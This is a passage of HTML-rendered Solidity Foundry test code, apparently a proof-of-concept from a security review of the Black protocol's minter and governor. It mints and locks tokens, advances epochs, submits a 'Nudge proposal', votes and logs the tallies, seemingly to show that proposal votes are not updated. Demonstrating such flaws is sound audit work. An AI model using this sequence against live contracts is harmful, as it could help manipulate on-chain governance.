class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10_000_000e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_statusNotUpdatingVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimants\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_initialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimants\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//zero % ownership of top protcols\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserABal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1_000_000e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserABal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWEEK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1800\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e\u0026lt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e67\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e           \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eskip\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWEEK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdate_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e             \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eepochCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eweekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e         \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreate_lock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserABal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e4\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e365\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edays\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eskip\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e3600\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eencodeWithSelector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enudge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eselector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochTimehash\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackTimeLibrary\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eepochNext\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epropose\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Nudge proposal\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eskip\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evotingDelay\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()+\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecastVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagainstVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabstainVotes\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        )= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eproposalVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Against Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagainstVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;For Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 